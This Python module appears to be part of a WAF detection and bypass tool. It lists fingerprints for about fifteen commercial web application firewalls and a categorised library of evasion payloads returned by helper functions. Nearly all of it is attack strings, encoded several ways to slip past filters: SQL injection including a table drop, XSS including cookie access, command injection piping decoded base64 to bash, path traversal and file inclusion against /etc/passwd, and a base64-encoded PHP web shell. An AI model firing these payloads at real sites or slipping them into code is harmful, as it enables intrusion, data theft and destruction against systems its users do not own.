"""
WAF Bypass Payload Library
Project #13: WAF Detection & Bypass
"""

# WAF Detection Signatures
WAF_SIGNATURES = {
    'Cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status', 'server: cloudflare'],
        'cookies': ['__cfduid', '__cf_bm', 'cf_clearance'],
        'body_patterns': ['cloudflare', 'cf-error'],
        'description': 'Cloudflare WAF/CDN'
    },
    'ModSecurity': {
        'headers': ['server: Apache', 'mod_security', 'ModSecurity'],
        'cookies': [],
        'body_patterns': ['ModSecurity', 'mod_security', 'Not Acceptable'],
        'description': 'ModSecurity (Open Source WAF)'
    },
    'AWS WAF': {
        'headers': ['x-amzn-RequestId', 'x-amz-cf-id', 'x-amzn-ErrorType'],
        'cookies': ['aws-waf-token'],
        'body_patterns': ['AWS WAF', 'Request blocked'],
        'description': 'Amazon AWS WAF'
    },
    'Incapsula': {
        'headers': ['x-iinfo', 'x-cdn'],
        'cookies': ['incap_ses', 'visid_incap'],
        'body_patterns': ['incapsula', 'Incapsula'],
        'description': 'Imperva Incapsula'
    },
    'Sucuri': {
        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
        'cookies': ['sucuri_cloudproxy'],
        'body_patterns': ['sucuri', 'Sucuri'],
        'description': 'Sucuri CloudProxy'
    },
    'Akamai': {
        'headers': ['x-akamai-transformed', 'x-akamai-config-log-detail'],
        'cookies': ['akamai_'],
        'body_patterns': ['akamai', 'AkamaiGHost'],
        'description': 'Akamai WAF'
    },
    'Imperva': {
        'headers': ['x-cdn', 'x-iinfo'],
        'cookies': ['incap_ses', 'visid_incap'],
        'body_patterns': ['imperva', 'Imperva'],
        'description': 'Imperva SecureSphere'
    },
    'Barracuda': {
        'headers': ['x-barracuda'],
        'cookies': ['barra_counter_session'],
        'body_patterns': ['barracuda', 'Barracuda'],
        'description': 'Barracuda WAF'
    },
    'F5 BIG-IP': {
        'headers': ['x-f5', 'x-wa-info'],
        'cookies': ['TS', 'BIGipServer', 'F5_ST'],
        'body_patterns': ['BIG-IP', 'F5 Networks'],
        'description': 'F5 BIG-IP ASM'
    },
    'Wordfence': {
        'headers': [],
        'cookies': ['wordfence_verifiedHuman', 'wfvt_'],
        'body_patterns': ['wordfence', 'Wordfence'],
        'description': 'Wordfence (WordPress)'
    },
    'Fortinet FortiWeb': {
        'headers': ['fortiwafsid'],
        'cookies': ['FORTIWAFSID'],
        'body_patterns': ['FortiWeb', 'Fortinet'],
        'description': 'Fortinet FortiWeb'
    },
    'Citrix NetScaler': {
        'headers': ['x-citrix', 'ns_af'],
        'cookies': ['citrix_ns_id', 'NSC_'],
        'body_patterns': ['NetScaler', 'Citrix'],
        'description': 'Citrix NetScaler'
    },
    'Radware': {
        'headers': ['x-rdwr'],
        'cookies': ['rdwr'],
        'body_patterns': ['Radware'],
        'description': 'Radware AppWall'
    },
    'StackPath': {
        'headers': ['x-sp-url', 'x-sp-waf'],
        'cookies': ['stackpath_'],
        'body_patterns': ['StackPath'],
        'description': 'StackPath WAF'
    },
    'Fastly': {
        'headers': ['x-fastly-request-id', 'fastly-io-info'],
        'cookies': ['fastly_'],
        'body_patterns': ['Fastly'],
        'description': 'Fastly WAF/CDN'
    }
}

# Bypass Payloads by Category
BYPASS_PAYLOADS = {
    'sql_injection': {
        'description': 'SQL Injection bypass payloads',
        'payloads': [
            # Basic SQLi
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
            
            # Case manipulation
            "SeLeCt * FrOm users",
            "UnIoN SeLeCt NULL--",
            "dRoP tAbLe users",
            
            # URL encoding
            "%27%20OR%20%271%27%3D%271",
            "%27%20UNION%20SELECT%20NULL--",
            
            # Double URL encoding
            "%2527%2520OR%2520%25271%2527%253D%25271",
            
            # Hex encoding
            "0x53454c454354",
            "0x554e494f4e",
            
            # SQL comments
            "UNION/**/SELECT/**/NULL--",
            "UNION/*!*/SELECT/*!*/NULL--",
            "UNION SELECT-- -",
            
            # Whitespace alternatives
            "UNION%09SELECT%09NULL--",
            "UNION%0ASELECT%0ANULL--",
            "UNION%0DSELECT%0DNULL--",
            
            # Parameter pollution
            "id=1&id=2' UNION SELECT NULL--",
            
            # Unicode encoding
            "\u0055\u004e\u0049\u004f\u004e \u0053\u0045\u004c\u0045\u0043\u0054",
        ]
    },
    'xss': {
        'description': 'XSS bypass payloads',
        'payloads': [
            # Basic XSS
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            
            # Case manipulation
            "<ScRiPt>alert(1)</ScRiPt>",
            "<ImG sRc=x OnErRoR=alert(1)>",
            "<SvG/OnLoAd=alert(1)>",
            
            # URL encoding
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
            
            # Double URL encoding
            "%253Cscript%253Ealert(1)%253C/script%253E",
            
            # HTML entity encoding
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            
            # Mixed encoding
            "<scr%69pt>alert(1)</scr%69pt>",
            "<img src=x onerror=alert(1)><!--",
            
            # Event handlers
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            
            # SVG variants
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin=alert(1)>",
            
            # Without parentheses
            "<script>alert`1`</script>",
            "<script>alert(document.cookie)</script>",
            
            # JavaScript protocol
            "javascript:alert(1)",
            "jaVasCript:alert(1)",
            "javascript:alert(1)//",
            
            # Data URI
            "data:text/html,<script>alert(1)</script>",
            
            # Parameter pollution
            "q=<script>alert(1)</script>&q=safe",
        ]
    },
    'command_injection': {
        'description': 'Command injection bypass payloads',
        'payloads': [
            # Basic command injection
            "; ls",
            "| ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            
            # Encoded
            "%3B%20ls",
            "%7C%20ls",
            
            # Double encoded
            "%253B%2520ls",
            
            # With comments
            "; ls #",
            "| ls #",
            
            # Whitespace alternatives
            ";ls",
            ";%09ls",
            ";%0Als",
            
            # Base64
            "; echo bHM= | base64 -d | bash",
        ]
    },
    'path_traversal': {
        'description': 'Path traversal bypass payloads',
        'payloads': [
            # Basic traversal
            "../",
            "../../",
            "../../../",
            
            # Encoded
            "..%2f",
            "..%5c",
            "%2e%2e%2f",
            "%2e%2e%5c",
            
            # Double encoded
            "..%252f",
            "%252e%252e%252f",
            
            # Unicode
            "..%c0%af",
            "..%c1%9c",
            
            # With null byte
            "../etc/passwd%00",
            
            # Non-standard
            "....//",
            "..../",
            "..;/",
            "..\\/",
            
            # Overlong UTF-8
            "%c0%ae%c0%ae/",
        ]
    },
    'file_inclusion': {
        'description': 'File inclusion bypass payloads',
        'payloads': [
            # Basic LFI
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            
            # Encoded
            "file%3A%2F%2F%2Fetc%2Fpasswd",
            "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php",
            
            # Double encoded
            "file%253A%252F%252F%252Fetc%252Fpasswd",
            
            # With null byte
            "file:///etc/passwd%00",
            
            # Wrappers
            "zip://shell.zip%23shell.php",
            "phar://shell.phar",
            "expect://id",
        ]
    },
    'general_evasion': {
        'description': 'General WAF evasion techniques',
        'payloads': [
            # Case manipulation
            "SeLeCt",
            "UnIoN",
            "ScRiPt",
            
            # Whitespace alternatives
            "SELECT%09FROM",
            "SELECT%0AFROM",
            "SELECT%0DFROM",
            "SELECT/**/FROM",
            
            # Comment injection
            "/**/",
            "/*!*/",
            "-- -",
            "#",
            
            # Null byte
            "%00",
            
            # HTTP parameter pollution
            "?id=1&id=2",
            "?id=1%26id=2",
            
            # Path manipulation
            "////",
            "....//",
            
            # Unicode normalization
            "ＳＥＬＥＣＴ",
            "ｕｎｉｏｎ",
            
            # Mixed encoding
            "%53%45%4C%45%43%54",
            "0x53454c454354",
        ]
    }
}

# Common WAF response patterns
WAF_BLOCK_PATTERNS = [
    r'blocked',
    r'forbidden',
    r'not acceptable',
    r'access denied',
    r'security',
    r'waf',
    r'firewall',
    r'malicious',
    r'suspicious',
    r'attack',
    r'block',
    r'deny',
    r'rejected',
    r'filtered',
    r'protected',
]

# WAF response codes commonly used for blocking
WAF_BLOCK_CODES = [403, 406, 419, 429, 500, 501, 503]

def get_all_payloads():
    """Get all payloads as a flat list"""
    all_payloads = []
    for category, data in BYPASS_PAYLOADS.items():
        for payload in data['payloads']:
            all_payloads.append({
                'category': category,
                'payload': payload
            })
    return all_payloads

def get_payloads_by_category(category):
    """Get payloads for a specific category"""
    if category in BYPASS_PAYLOADS:
        return BYPASS_PAYLOADS[category]['payloads']
    return []

def get_waf_signatures():
    """Get WAF signatures"""
    return WAF_SIGNATURES